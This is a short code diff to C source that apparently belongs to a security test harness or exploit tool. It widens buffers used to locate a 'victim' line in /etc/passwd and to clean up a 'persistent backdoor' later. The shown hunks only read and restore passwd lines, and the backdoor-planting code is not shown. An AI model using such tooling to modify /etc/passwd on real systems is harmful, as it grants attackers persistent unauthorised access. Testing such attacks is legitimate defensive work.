@@ -42,10 +42,13 @@
  * padding.
  */
 
+/* Line buffer is 512 bytes — enough for any sane /etc/passwd entry,
+ * including ones with very long gecos strings or unusual home paths.
+ * Lines longer than this are silently skipped by find_victim(). */
 struct victim {
     off_t  line_off;
     size_t line_len;
-    char   line[256];
+    char   line[512];
     char   name[64];
 };
 
@@ -85,7 +88,7 @@ static bool find_victim(struct victim *v)
         size_t len = nl ? (size_t)(nl - line) : (size_t)(end - line);
         if (len == 0 || len >= sizeof(v->line)) goto next;
 
-        char tmp[256];
+        char tmp[512];
         memcpy(tmp, line, len);
         tmp[len] = '\0';
 
@@ -268,7 +271,7 @@ df_result_t backdoor_cleanup(void)
     log_step("Persistent backdoor — cleanup");
 
     off_t line_off = 0;
-    char victim_line[256];
+    char victim_line[512];
     size_t victim_len = 0;
     if (!load_state(&line_off, victim_line, sizeof(victim_line), &victim_len)) {
         log_bad("no usable state file at %s", STATE_FILE);
@@ -279,7 +282,7 @@ df_result_t backdoor_cleanup(void)
     /* Read the CURRENT bytes (post-install). */
     int fd = open("/etc/passwd", O_RDONLY);
     if (fd < 0) { log_bad("open passwd: %s", strerror(errno)); return DF_TEST_ERROR; }
-    char cur[256];
+    char cur[512];
     if (pread(fd, cur, victim_len, line_off) != (ssize_t)victim_len) {
         log_bad("pread: %s", strerror(errno));
         close(fd); return DF_TEST_ERROR;
